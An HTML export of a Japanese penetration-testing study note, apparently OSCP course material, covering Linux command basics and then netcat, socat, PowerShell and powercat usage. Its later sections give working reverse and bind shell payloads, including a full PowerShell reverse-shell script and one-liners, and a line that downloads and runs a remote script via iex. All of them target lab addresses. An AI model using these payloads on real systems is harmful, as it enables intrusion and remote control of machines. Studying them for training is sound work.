<!DOCTYPE html>
<html>
<head>
<title>pentest_studey.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<h2 id="linux%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0">Linuxファイルシステム</h2>
<ul>
<li>/bin - 基本プログラム (ls、cd、cat など)</li>
<li>/sbin - システムプログラム (fdisk, mkfs, sysctl など)</li>
<li>/etc - 設定ファイル</li>
<li>/tmp - 一時ファイル（通常、起動時に削除される)</li>
<li>/usr/bin - アプリケーション (apt, ncat, nmap など)</li>
<li>/usr/share - アプリケーションのサポートファイルとデータファイル</li>
</ul>
<h2 id="linux%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E6%A4%9C%E7%B4%A2">Linuxにおけるファイル検索</h2>
<table>
<thead>
<tr>
<th>コマンド</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>which</td>
<td>$PATH環境変数に定義されているディレクトリを指定されたファイル名で検索<br>ファイルが見つかった場合、ファイルのパスをフルパスで返す</td>
</tr>
<tr>
<td>locate</td>
<td>locateはハードディスク全体ではなくlocate.dbという名前の内臓データベースを検索する<br>このデータベースはcronによって自動更新され、updatedbコマンドを使用すれば手動更新も可能</td>
</tr>
<tr>
<td>fine</td>
<td>locateとは違い、様々な方法でファイルを検索可能<br>ファイルの日付、サイズ、所有者、タイムスタンプ、パーミッション</td>
</tr>
</tbody>
</table>
<pre class="hljs"><code><div>kali@kali:~$ sudo find / -name sbd*
/usr/bin/sbd
/usr/share/doc/sbd
/usr/share/windows-resources/sbd
/usr/share/windows-resources/sbd/sbd.exe
/usr/share/windows-resources/sbd/sbdbg.exe
/var/cache/apt/archives/sbd_1.37-1kali3_amd64.deb
/var/lib/dpkg/info/sbd.md5sums
/var/lib/dpkg/info/sbd.list
</div></code></pre>
<h2 id="echo-path">echo $PATH</h2>
<p>これらのディレクトリのいずれかに実行可能ファイルを配置する場合、実行可能ファイル/スクリプトへのパスを設定する必要がない</p>
<pre class="hljs"><code><div>kali@kali:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</div></code></pre>
<h2 id="wce32exe">wce32.exe</h2>
<p>Windowsからハッシュを収集できるツール。<br>
/usr/share/wce/</p>
<h2 id="netstatss">netstat/ss</h2>
<p>ネットワーク状態確認コマンド。</p>
<pre class="hljs"><code><div>どのプロセスがそのポートを開放しているか確認
netstat -tulpn
ss -tulpn
</div></code></pre>
<h2 id="systemctl">systemctl</h2>
<p>systemdをコントロールするコマンド。<br>
serviceコマンドとの違いはないが、serviceコマンドはinitを呼び出すスクリプトなのに対して、systemctlコマンドはネイティブなバイナリコマンドとなっている。</p>
<pre class="hljs"><code><div>#サービスの開始
systemctl start ssh
#サービスの停止
systemctl stop ssh
#サービスの再起動
systemctl restart ssh
#サービスの起動状態表示
system status ssh
#サービスが自動起動するかの確認コマンド
systemctl list-unit-files -t service
#ブート時にサービス自動起動の有効化
systemctl enable ssh
#ブート時のサービス自動起動の無効化
systemctl disable ssh
</div></code></pre>
<h2 id="%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E3%81%AE%E8%A8%AD%E5%AE%9A">環境変数の設定</h2>
<p>環境変数はexportコマンドで定義することができる。</p>
<pre class="hljs"><code><div>kali@kali:~$ export a=10.11.1.220
kali@kali:~$ ping -c 2 $a
PING 10.11.1.220 (10.11.1.220) 56(84) bytes of data.
64 bytes from 10.11.1.220: icmp_seq=1 ttl=62 time=2.23 ms
64 bytes from 10.11.1.220: icmp_seq=2 ttl=62 time=1.56 ms
</div></code></pre>
<p>exportコマンドは現在のBashインスタンスから生成されるあらゆるサブプロセスから変数にアクセスできるようにする。<br>
exportコマンド無しで環境変数を設定すると現在のシェルでしか利用できない。<br>
envコマンドを用いることで設定された環境変数を確認することができる。</p>
<pre class="hljs"><code><div>yukitsukai@DESKTOP-ES4DRSU:~$ env
SHELL=/bin/zsh
WSL_DISTRO_NAME=kali-linux
LESS_TERMCAP_se=
LESS_TERMCAP_so=
NAME=DESKTOP-ES4DRSU
PWD=/home/yukitsukai
LOGNAME=yukitsukai
HOME=/home/yukitsukai
LANG=en_US.UTF-8
</div></code></pre>
<h2 id="stdinsdtoutstderr-stdio-%22standard-inputoutput%22">STDIN,SDTOUT,STDERR (stdio &quot;Standard Input/Output&quot;)</h2>
<table>
<thead>
<tr>
<th>StreamName</th>
<th>説明</th>
</tr>
</thead>
<tbody>
<tr>
<td>STDIN</td>
<td>プログラムに入力されるデータ</td>
</tr>
<tr>
<td>STDOUT</td>
<td>プログラムから出力されるデータ</td>
</tr>
<tr>
<td>STDERR</td>
<td>エラーメッセージ</td>
</tr>
</tbody>
</table>
<p>STDIN、STDOUT、STDERRのストリーム番号はそれぞれ0、1、2と定義されている。<br>
このためストリーム番号を「&gt;」演算子の前に置くことで、リダイレクトすることもできる。</p>
<pre class="hljs"><code><div>kali@kali:~$ ls ./test 2&gt;error.txt
kali@kali:~$ cat error.txt
ls: cannot access '/test': No such file or directory
</div></code></pre>
<h2 id="%E3%83%86%E3%82%AD%E3%82%B9%E3%83%88%E3%81%AE%E6%A4%9C%E7%B4%A2%E3%81%A8%E6%93%8D%E4%BD%9C%E6%AF%94%E8%BC%83">テキストの検索と操作,比較</h2>
<h3 id="grep">grep</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-O</td>
<td>正規表現で定義された文字列のみ</td>
</tr>
<tr>
<td>-v</td>
<td>検索文字列にマッチしない行のみを表示(除外する)</td>
</tr>
</tbody>
</table>
<h3 id="wc">wc</h3>
<p>テキストファイルの行数や単語数、文字数を数えるコマンド。<br>
(指定したテキストファイルの行数、単語数、バイト数)</p>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-c</td>
<td>バイト数の表示</td>
</tr>
<tr>
<td>-m</td>
<td>文字数を表示</td>
</tr>
<tr>
<td>-l</td>
<td>改行の数を表示</td>
</tr>
<tr>
<td>-w</td>
<td>単語数を表示</td>
</tr>
</tbody>
</table>
<h3 id="sed">sed</h3>
<p>文字列を全置換したり、行単位で抽出したり、削除したり、いろいろなテキスト処理のできるコマンド。</p>
<pre class="hljs"><code><div>kali@kali:~$ echo &quot;I need to try hard&quot; | sed 's/hard/harder/' I need to try harder
</div></code></pre>
<h3 id="cut">cut</h3>
<p>ある行からテキストの一部を抽出し、それを標準出力に出力するために使用します。よく使われるオプションとして切り取るフィールド番号を表す-fや、フィールドの区切りを表す-dなどがある。
-dでカット、-fでカットしたものの選択(番号で)</p>
<pre class="hljs"><code><div>kali@kali:~$ cut -d &quot;:&quot; -f 1 /etc/passwd root
daemon
bin
.
.
</div></code></pre>
<h3 id="awk">awk</h3>
<p>空白や記号で区切られたテキストを処理するコマンド。<br>
cutはフィールドの区切り文字として1文字しか受け付けないのに対し、awkははるかに柔軟に対応できる。<br>
-Fオプションは区切り文字の指定。</p>
<pre class="hljs"><code><div>kali@kali:~$ echo &quot;hello::there::friend&quot; | awk -F &quot;::&quot; '{print $1, $3}' 
hello friend
</div></code></pre>
<h3 id="sort">sort</h3>
<p>テキストファイルを行単位で並べ替えるコマンド。<br>
オプションなしだとキャラクターコード順に並べ替える。</p>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-u</td>
<td>同一行は最初の一つ目だけを表示</td>
</tr>
<tr>
<td>-c</td>
<td>並べ替えられているか確認</td>
</tr>
<tr>
<td>-r</td>
<td>逆順で並べ替える</td>
</tr>
<tr>
<td>-n</td>
<td>文字列を数値と見なして並べ替える</td>
</tr>
</tbody>
</table>
<h3 id="uniq">uniq</h3>
<p>重複している行を削除するコマンド。<br>
uniqコマンドは、元のテキストが&quot;並べ替え済み&quot;であることが前提になるので、必要に応じて先に「sort」コマンドで並べ替えを実行しておく。</p>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-c</td>
<td>各行の前に出現回数を出力する</td>
</tr>
</tbody>
</table>
<h3 id="host">host</h3>
<p>nslookupコマンド同様、ドメイン名からIPアドレス、あるいはIPアドレスからドメイン名を調べるコマンド。</p>
<h3 id="comm">comm</h3>
<p>2つのテキストファイルを比較し，それぞれのファイルに固有の行と共通の行を表示する。<br>
-12をつけると両ファイルに見られるものを抽出。</p>
<pre class="hljs"><code><div>kali@kali:~$ comm scan-a.txt scan-b.txt
kali@kali:~$ comm -12 scan-a.txt scan-b.txt
</div></code></pre>
<h3 id="diff">diff</h3>
<p>commコマンドと同様にファイル間の差分を検出するためのコマンド。<br>
-c(コンテキスト形式)とユニファイド形式(-u)で表示可能。</p>
<h2 id="%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E7%AE%A1%E7%90%86">プロセス管理</h2>
<p>Linuxカーネルは、プロセスを使ってマルチタスクを管理している。カーネルは、整理整頓のために各プロセスの情報を保持し、各プロセスにはプロセスID（PID）と呼ばれる番号が割り当てられている。<br>
シェルで動かしたプロセスことをジョブと呼ぶ。<br>
下記のようなパイプを使って二つのプロセスを実行している場合も一つのジョブとする。</p>
<pre class="hljs"><code><div>cat test.txt | grep hello
</div></code></pre>
<h3 id="%E3%83%90%E3%83%83%E3%82%AF%E3%82%B0%E3%83%A9%E3%82%A6%E3%83%B3%E3%83%89%E3%82%B8%E3%83%A7%E3%83%96">バックグラウンドジョブ</h3>
<p>&amp;をつけることでバックグラウンドでジョブを実行。</p>
<pre class="hljs"><code><div>kali@kali:~$ ping -c 400 localhost &gt; ping_results.txt &amp;
</div></code></pre>
<p>Ctrl+zで停止、bgでジョブの再開。</p>
<pre class="hljs"><code><div>kali@kali:~$ ping -c 400 localhost &gt; ping_results.txt
^Z
[1]+ Stopped ping -c 400 localhost &gt; ping_results.txt
kali@kali:~$ bg
[1]+ ping -c 400 localhost &gt; ping_results.txt kali@kali:~$
</div></code></pre>
<p>jobsコマンドにより現在のジョブ一覧を表示。<br>
-lを使用することでリスト表示にプロセスIDを付加。<br>
fgコマンドにより再開したいジョブの選択。</p>
<pre class="hljs"><code><div>kali@kali:~$ ping -c 400 localhost &gt; ping_results.txt
^Z
[1]+ Stopped ping -c 400 localhost &gt; ping_results.txt
kali@kali:~$ find / -name sbd.exe
^Z
[2]+ Stopped
kali@kali:~$ jobs [1]- Stopped [2]+ Stopped
find / -name sbd.exe
ping -c 400 localhost &gt; ping_results.txt find / -name sbd.exe
kali@kali:~$ fg %1
ping -c 400 localhost &gt; ping_results.txt ^C
kali@kali:~$ jobs
[2]+ Stopped find / -name sbd.exe
kali@kali:~$ fg
find / -name sbd.exe /usr/share/windows-resources/sbd/sbd.exe
</div></code></pre>
<h3 id="pskill%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%AB%E3%82%88%E3%82%8B%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB">ps,killコマンドによるプロセスコントロール</h3>
<p>jobsコマンドは現在のターミナルセッションのジョブを表示していたが、psコマンドではシステム全体のプロセスをリストアップする。</p>
<h4 id="ps">ps</h4>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-e</td>
<td>全てのプロセスを表示</td>
</tr>
<tr>
<td>-f</td>
<td>フルフォーマットのリストを表示</td>
</tr>
<tr>
<td>-C</td>
<td>アプリケーションの名前が分かっている場合、指定して表示</td>
</tr>
</tbody>
</table>
<pre class="hljs"><code><div>ps aux
・a: 端末操作のプロセス(自分 + 他ユーザー)を表示する
・u: 各プロセスの実行ユーザーやCPU, Mem(メモリ)等の情報も表示する
・x: 端末操作のないプロセス(daemon等)も表示する
</div></code></pre>
<h2 id="%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%8A%E3%82%88%E3%81%B3%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%AE%E7%9B%A3%E8%A6%96">ファイルおよびコマンドの監視</h2>
<h3 id="teil">teil</h3>
<p>tailはファイルの最終行から数行を表示するコマンド。  標準では１０行を表示する。</p>
<p>fオプション（follow）は、対象となるファイルの成長に合わせて出力を継続的に更新する。もう一つの便利なスイッチは-nXで、これはデフォルトの10行ではなく、最後の「X」行数を出力する。</p>
<h3 id="watch">watch</h3>
<p>指定したコマンドを2秒間隔で繰り返し実行するコマンド。
-n 1のように明示すると繰り返し時間間隔を変更でき、この場合コマンドを1びょうかんかくで　繰り返し実行する。</p>
<pre class="hljs"><code><div>kali@kali:~$ watch date
Every 2.0s: date                                                              DESKTOP-ES4DRSU: Fri Apr 23 14:47:27 2021
Fri 23 Apr 2021 02:47:27 PM JST
</div></code></pre>
<h2 id="%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%83%80%E3%82%A6%E3%83%B3%E3%83%AD%E3%83%BC%E3%83%89">ファイルのダウンロード</h2>
<h3 id="wget">wget</h3>
<p>-Oを指定することで保存する際のファイル名を指定することが可能。</p>
<pre class="hljs"><code><div>kali@kali:~$ wget -O report_wget.pdf https://www.offensive-security.com/reports/penetr ation-testing-sample-report-2013.pdf
</div></code></pre>
<h3 id="curl">curl</h3>
<p>curlは多数のプロトコルを使用してサーバーとの間でデータを転送するためのツール。</p>
<pre class="hljs"><code><div>kali@kali:~$ curl -o report.pdf https://www.offensive-security.com/reports/penetration -testing-sample-report-2013.pdf
</div></code></pre>
<h3 id="axel">axel</h3>
<p>FTPやHTTPサーバから複数の接続を解してファイルを天sのうするコマンド。<br>
複数の接続数を指定する-nオプション。<br>
より簡潔な進行状況表示のために-aオプション。<br>
ダウンロードしたファイルに別のファイル名を指定するための-oオプション。</p>
<pre class="hljs"><code><div>kali@kali:~$ axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/repor ts/penetration-testing-sample-report-2013.pdf
</div></code></pre>
<h1 id="%E5%AE%9F%E7%94%A8%E7%9A%84%E3%81%AA%E3%83%84%E3%83%BC%E3%83%AB">実用的なツール</h1>
<h2 id="netcat">Netcat</h2>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-n</td>
<td>DNSの名前解決をスキップする</td>
</tr>
<tr>
<td>-v</td>
<td>冗長性の追加</td>
</tr>
<tr>
<td>-l</td>
<td>リスナーの作成</td>
</tr>
<tr>
<td>-p</td>
<td>リッスンポートの指定</td>
</tr>
</tbody>
</table>
<h3 id="%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E5%8F%97%E3%81%91%E6%B8%A1%E3%81%97netcat">ファイルの受け渡し(netcat)</h3>
<pre class="hljs"><code><div>受信側
C:\Users\offsec&gt; nc -nlvp 4444 &gt; incoming.exe
listening on [any] 4444 ...

送信側
kali@kali:~$ locate wget.exe
/usr/share/windows-resources/binaries/wget.exe
kali@kali:~$ nc -nv 10.11.0.22 4444 &lt; /usr/share/windows-resources/binaries/wget.exe
</div></code></pre>
<h2 id="socat">Socat</h2>
<h3 id="netcat-vs-socat">Netcat vs Socat</h3>
<pre class="hljs"><code><div>kali@kali:~$ nc &lt;remote server's ip address&gt; 80
kali@kali:~$ socat - TCP4:&lt;remote server's ip address&gt;:8
</div></code></pre>
<h3 id="%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E8%BB%A2%E9%80%81">ファイルの転送</h3>
<pre class="hljs"><code><div>送信側
kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt

受信側
C:\Users\offsec&gt; socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
C:\Users\offsec&gt; type received_secret_passwords.txt
&quot;try harder!!!&quot;
</div></code></pre>
<h3 id="reverse-shell">reverse shell</h3>
<pre class="hljs"><code><div>待ち受け側
C:\Users\offsec&gt; socat -d -d TCP4-LISTEN:443 STDOUT
... socat[4388] N listening on AF=2 0.0.0.0:443

接続側
kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
</div></code></pre>
<h3 id="socat%E3%81%AE%E9%80%9A%E4%BF%A1%E6%9A%97%E5%8F%B7%E5%8C%96">socatの通信暗号化</h3>
<h4 id="openssl">openssl</h4>
<p>・req: 新しい証明書署名要求を開始
・-newkey: 新しい秘密鍵を生成
・rsa:2048：2,048ビットの鍵長でRSA暗号を使用
・-nodes：パスフレーズ保護なしで秘密鍵を保存
・-keyout: 鍵をファイルに保存
・-x509：証明書要求の代わりに自己署名証明書を出力
・-days：有効期間を日単位で設定
・-out: 証明書をファイルに保存</p>
<p>opensslを用いて鍵と証明書の生成。<br>
生成したものを.pemに変換してsocatで読み込めるようにする。</p>
<pre class="hljs"><code><div>kali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36
2 -out bind_shell.crt
nGenerating a 2048 bit RSA private key
.....................+++
................................+++
writing new private key to 'bind_shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:Georgia
Locality Name (eg, city) []:Atlanta
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec
Organizational Unit Name (eg, section) []:Try Harder Department
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
kali@kali:~$ cat bind_shell.key bind_shell.crt &gt; bind_shell.pem
</div></code></pre>
<pre class="hljs"><code><div>受信側
kali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin
/bash

送信側
C:\Users\offsec&gt; socat - OPENSSL:10.11.0.4:443,verify=0
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
whoami
kali
</div></code></pre>
<h2 id="powershell">PowerShell</h2>
<h3 id="%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%83%80%E3%82%A6%E3%83%B3%E3%83%AD%E3%83%BC%E3%83%89">ファイルのダウンロード</h3>
<pre class="hljs"><code><div>C:\Users\offsec&gt; powershell -c (New-Object Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe', 'wget.exe')
</div></code></pre>
<h3 id="reverse-shell">reverse shell</h3>
<pre class="hljs"><code><div>$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2&gt;&amp;1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
</div></code></pre>
<h3 id="%E3%83%AF%E3%83%B3%E3%83%A9%E3%82%A4%E3%83%8A%E3%83%BCreverse-shell">ワンライナーreverse shell</h3>
<pre class="hljs"><code><div>C:\Users\offsec&gt; powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient('10. 11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()&quot;
</div></code></pre>
<h3 id="%E3%83%AF%E3%83%B3%E3%83%A9%E3%82%A4%E3%83%8A%E3%83%BCbind-shell">ワンライナーbind shell</h3>
<pre class="hljs"><code><div>C:\Users\offsec&gt; powershell -c &quot;$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString ($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto p()&quot;

kali@kali:~$ nc -nv 10.11.0.22 443
(UNKNOWN) [10.11.0.22] 443 (https) open
ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
Connection-specific DNS Suffix . :
IPv4 Address. . . . . . . . . . . : 10.11.0.22
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 10.11.0.1
C:\Users\offsec&gt;
</div></code></pre>
<h2 id="powercat">Powercat</h2>
<p>PowercatはPowerShell版のNetcat。<br>
Dot-sourcingを使用して、powercat.ps1スクリプトをロードすることによりPowerShell内で直接powercat関数を使用可能になる。</p>
<pre class="hljs"><code><div>PS C:\Users\Offsec&gt; . .\powercat.ps1
</div></code></pre>
<p>攻撃対象となるマシンがインターネットに接続されている場合、githubからダウンロードさせることも可能。</p>
<pre class="hljs"><code><div> PS C:\Users\Offsec&gt; iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
</div></code></pre>
<pre class="hljs"><code><div>PS C:\Users\offsec&gt; powercat -h
powercat - Netcat, The Powershell Version
Github Repository: https://github.com/besimorhino/powercat
</div></code></pre>
<h3 id="%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E8%BB%A2%E9%80%81">ファイル転送</h3>
<pre class="hljs"><code><div>受信側
kali@kali:~$ sudo nc -lnvp 443 &gt; receiving_powercat.ps1 listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63661

送信側
PS C:\Users\Offsec&gt; powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
</div></code></pre>
<h3 id="reverse-shell">reverse shell</h3>
<pre class="hljs"><code><div>受信側
kali@kali:~$ sudo nc -lvp 443 listening on [any] 443 ...

送信側
PS C:\Users\offsec&gt; powercat -c 10.11.0.4 -p 443 -e cmd.exe
</div></code></pre>
<h3 id="bind-shell">bind shell</h3>
<pre class="hljs"><code><div>受信側
PS C:\Users\offsec&gt; powercat -l -p 443 -e cmd.exe

送信側
kali@kali:~$ nc 10.11.0.22 443
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\offsec&gt;
</div></code></pre>
